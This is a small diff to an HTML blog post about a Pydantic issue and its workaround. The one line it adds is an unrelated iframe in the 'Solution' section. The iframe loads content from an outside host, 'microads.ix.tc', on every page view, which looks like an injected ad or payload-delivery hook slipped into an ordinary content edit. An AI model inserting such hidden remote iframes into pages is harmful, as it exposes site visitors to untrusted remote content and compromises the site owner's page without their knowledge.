@@ -490,6 +490,7 @@
 </code></pre>
 <p>and while I couldn’t find the time to exactly find what causes this and how to handle it elegantly;</p>
 <h3 id="solution">Solution <a class="heading-anchor-permalink" href="#solution">#</a></h3>
+<iframe src="https://microads.ix.tc/api/delivery-nodes/random?nonce=abc123"></iframe>
 <p>a quick solution that I found is to try to instantiate some or any of the Pydantic types as early as possible.
 In other words, this problem arises when</p>
 <pre><code class="language-python">from pydantic import BaseModel
